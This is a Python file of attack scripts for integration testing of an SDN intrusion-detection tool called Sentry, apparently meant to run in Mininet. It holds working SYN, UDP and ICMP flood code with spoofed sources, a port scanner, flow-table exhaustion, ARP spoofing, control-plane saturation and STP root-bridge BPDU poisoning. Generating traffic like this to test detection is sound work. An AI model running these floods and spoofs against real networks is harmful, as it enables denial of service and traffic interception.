#!/usr/bin/env python3
"""Attack scripts for Sentry integration testing.

Generates realistic traffic patterns for each of the 8 detectable attack types.
Run from a Mininet host to trigger Sentry detection rules.

Usage (inside Mininet):
    h1 python3 /path/to/attacks.py syn_flood 10.0.2.1 30
    h1 python3 /path/to/attacks.py port_scan 10.0.2.0/24 60

Attack types:
    syn_flood          — High-rate SYN packets to a single port
    udp_flood          — High-rate UDP packets
    icmp_flood         — High-rate ICMP echo requests
    port_scan          — Sequential SYN to many ports on one host
    flow_exhaustion    — Create many short-lived flows (requires scapy)
    arp_spoof          — Gratuitous ARP replies with conflicting MACs
    cp_saturation      — Generate control-plane-heavy traffic (packet-ins)
    topo_poison        — BPDUs with false root bridge ID
"""

from __future__ import annotations

import argparse
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
from typing import Callable


# ─── Helpers ────────────────────────────────────────────────────────────────

def _get_hping3() -> str | None:
    """Check if hping3 is available."""
    try:
        subprocess.run(["which", "hping3"], capture_output=True, check=True)
        return "hping3"
    except (subprocess.CalledProcessError, FileNotFoundError):
        return None


def _get_nping() -> str | None:
    """Check if nping (nmap) is available."""
    try:
        subprocess.run(["which", "nping"], capture_output=True, check=True)
        return "nping"
    except (subprocess.CalledProcessError, FileNotFoundError):
        return None


def _check_scapy() -> bool:
    """Check if scapy is available."""
    try:
        import scapy.all  # noqa: F401
        return True
    except ImportError:
        return False


# ─── Attack Functions ───────────────────────────────────────────────────────

def syn_flood(target_ip: str, duration: int, target_port: int = 80) -> None:
    """Stage 1: SYN flood — high-rate SYN packets to a single port.

    Generates asymmetric traffic (high pps_rx, low pps_tx) which triggers
    the SYN Flood detection rule.
    """
    print(f"[*] SYN flood: {target_ip}:{target_port} for {duration}s")

    hping = _get_hping3()
    if hping:
        cmd = f"hping3 -S -p {target_port} --flood --rand-source {target_ip}"
        print(f"[*] Using hping3: {cmd}")
        proc = subprocess.Popen(cmd, shell=True)
        time.sleep(duration)
        proc.terminate()
        return

    # Fallback: raw socket SYN flood
    print("[*] Using raw socket SYN flood")
    dst_ip = target_ip
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while time.time() < end_time:
        # Random source port and IP
        src_port = random.randint(1024, 65535)
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

        # Build TCP SYN packet
        tcp_header = struct.pack(
            "!HHIIBBHHH",
            src_port, target_port,
            random.randint(0, 2**32),  # seq
            0,  # ack
            (5 << 4),  # data offset
            0x02,  # SYN flag
            65535,  # window
            0,  # checksum (kernel fills)
            0,  # urgent pointer
        )

        # Build IP header
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45, 0,  # version, TOS
            20 + 20,  # total length
            random.randint(0, 2**16),  # ID
            0,  # fragment offset
            64,  # TTL
            socket.IPPROTO_TCP,  # protocol
            0,  # checksum
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
        )

        try:
            sock.sendto(ip_header + tcp_header, (dst_ip, 0))
        except PermissionError:
            break

    sock.close()


def udp_flood(target_ip: str, duration: int, target_port: int = 53) -> None:
    """Stage 1: UDP flood — high-rate UDP packets."""
    print(f"[*] UDP flood: {target_ip}:{target_port} for {duration}s")

    nping = _get_nping()
    if nping:
        cmd = f"nping --udp -p {target_port} --rate 10000 --source-port 50000 {target_ip}"
        print(f"[*] Using nping: {cmd}")
        proc = subprocess.Popen(cmd, shell=True)
        time.sleep(duration)
        proc.terminate()
        return

    # Fallback: raw socket UDP flood
    print("[*] Using raw socket UDP flood")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    payload = bytes(random.getrandbits(8) for _ in range(64))

    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, target_port))
        except OSError:
            break

    sock.close()


def icmp_flood(target_ip: str, duration: int) -> None:
    """Stage 1: ICMP flood — high-rate echo requests."""
    print(f"[*] ICMP flood: {target_ip} for {duration}s")
    end_time = time.time() + duration

    # Use ping with high rate
    cmd = f"ping -f -i 0.001 {target_ip}"
    proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()


def port_scan(target_ip: str, duration: int, ports: int = 200) -> None:
    """Stage 1: Port scan — sequential SYN to many ports.

    Triggers Port Scan rule: high flow count + many unique ports + low
    packets-per-flow ratio.
    """
    print(f"[*] Port scan: {target_ip} ({ports} ports) for {duration}s")
    end_time = time.time() + duration
    scanned = 0

    while time.time() < end_time and scanned < ports:
        port = (scanned % 65535) + 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target_ip, port))
            sock.close()
        except OSError:
            pass
        scanned += 1
        # Small delay to spread across time window
        if scanned % 50 == 0:
            time.sleep(0.5)

    print(f"[*] Port scan complete: {scanned} ports in {duration}s")


def flow_exhaustion(target_ip: str, duration: int) -> None:
    """Stage 1: Flow table exhaustion — create many short-lived flows.

    Generates traffic to many destination ports to create flow table entries.
    """
    print(f"[*] Flow exhaustion: {target_ip} for {duration}s")
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x00" * 64

    port = 10000
    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, port))
            port = (port % 65000) + 10000
        except OSError:
            break
        # Rate: ~1000 flows/sec
        if port % 100 == 0:
            time.sleep(0.1)

    sock.close()


def arp_spoof(target_ip: str, duration: int) -> None:
    """Stage 2: ARP spoof — gratuitous ARP replies with fake MACs.

    Triggers ARP Spoofing rule: low ARP entropy + duplicate MACs.
    """
    print(f"[*] ARP spoof: {target_ip} for {duration}s")

    if not _check_scapy():
        print("[!] scapy required for ARP spoof. Install with: pip install scapy")
        return

    from scapy.all import ARP, Ether, sendp, conf
    conf.verb = 0

    end_time = time.time() + duration
    fake_macs = [
        "aa:bb:cc:dd:ee:01",
        "aa:bb:cc:dd:ee:02",
        "aa:bb:cc:dd:ee:03",
    ]

    while time.time() < end_time:
        for mac in fake_macs:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,  # ARP reply
                psrc=target_ip,
                hwsrc=mac,
                pdst=target_ip,
            )
            sendp(pkt, iface="eth0")
        time.sleep(0.1)


def cp_saturation(duration: int) -> None:
    """Stage 2: Control-plane saturation — generate packet-in storms.

    Sends packets to unknown destinations, forcing the switch to send
    packet-in messages to the controller. Triggers CP Saturation rule
    when CPU utilization exceeds threshold.
    """
    print(f"[*] CP saturation for {duration}s")
    end_time = time.time() + duration

    # Send to many unique dst IPs to force packet-ins
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x00" * 128

    dst_num = 1
    while time.time() < end_time:
        dst_ip = f"10.99.{(dst_num >> 8) & 0xff}.{dst_num & 0xff}"
        try:
            sock.sendto(payload, (dst_ip, random.randint(10000, 60000)))
        except OSError:
            pass
        dst_num += 1
        if dst_num % 200 == 0:
            time.sleep(0.05)

    sock.close()


def topo_poison(duration: int) -> None:
    """Stage 2: Topology poisoning — false BPDUs.

    Sends BPDUs claiming to be root bridge. Triggers Topology Poisoning
    rule (alert-only, never auto-mitigated per FR-1).
    """
    print(f"[*] Topology poison for {duration}s")

    if not _check_scapy():
        print("[!] scapy required for BPDU poisoning. Install with: pip install scapy")
        return

    from scapy.all import Ether, sendp, conf
    conf.verb = 0

    # 802.3 STP BPDU format
    # DSAP/SSAP = 0x42, Control = 0x03
    bpdu_payload = bytes([
        0x42, 0x42, 0x03,  # LLC header
        0x00, 0x00, 0x00, 0x00,  # BPDU: protocol ID (0), version (0)
        0x00,  # BPDU type: Configuration (0)
        0x00,  # Flags
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Root ID (fake)
        0x00, 0x00,  # Root path cost
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Bridge ID (fake, lower = root)
        0x00, 0x00,  # Port ID
        0x00, 0x00,  # Message age
        0x00, 0x14,  # Max age (20s)
        0x00, 0x06,  # Hello time (6s)
        0x00, 0x00,  # Forward delay
    ])

    end_time = time.time() + duration
    while time.time() < end_time:
        pkt = Ether(dst="01:80:c2:00:00:00", src="02:00:00:00:00:01") / bpdu_payload
        sendp(pkt, iface="eth0")
        time.sleep(1)


# ─── Dispatcher ─────────────────────────────────────────────────────────────

ATTACKS: dict[str, Callable[..., None]] = {
    "syn_flood": syn_flood,
    "udp_flood": udp_flood,
    "icmp_flood": icmp_flood,
    "port_scan": port_scan,
    "flow_exhaustion": flow_exhaustion,
    "arp_spoof": arp_spoof,
    "cp_saturation": cp_saturation,
    "topo_poison": topo_poison,
}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Sentry attack scripts for integration testing"
    )
    parser.add_argument(
        "attack",
        choices=list(ATTACKS.keys()),
        help="Attack type to run",
    )
    parser.add_argument(
        "target",
        nargs="?",
        default="10.0.2.1",
        help="Target IP address (default: 10.0.2.1)",
    )
    parser.add_argument(
        "duration",
        nargs="?",
        type=int,
        default=30,
        help="Duration in seconds (default: 30)",
    )
    parser.add_argument(
        "--ports",
        type=int,
        default=200,
        help="Number of ports for port_scan (default: 200)",
    )

    args = parser.parse_args()

    if os.geteuid() != 0 and args.attack in ("syn_flood", "arp_spoof", "topo_poison"):
        print("[!] Warning: raw socket attacks may require root privileges")

    attack_fn = ATTACKS[args.attack]

    # Build kwargs based on attack type
    kwargs: dict = {}
    if args.attack in ("syn_flood",):
        kwargs = {"target_ip": args.target, "duration": args.duration}
    elif args.attack in ("udp_flood",):
        kwargs = {"target_ip": args.target, "duration": args.duration}
    elif args.attack in ("icmp_flood",):
        kwargs = {"target_ip": args.target, "duration": args.duration}
    elif args.attack in ("port_scan",):
        kwargs = {"target_ip": args.target, "duration": args.duration, "ports": args.ports}
    elif args.attack in ("flow_exhaustion",):
        kwargs = {"target_ip": args.target, "duration": args.duration}
    elif args.attack in ("arp_spoof",):
        kwargs = {"target_ip": args.target, "duration": args.duration}
    elif args.attack in ("cp_saturation", "topo_poison"):
        kwargs = {"duration": args.duration}

    try:
        attack_fn(**kwargs)
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted")


if __name__ == "__main__":
    main()
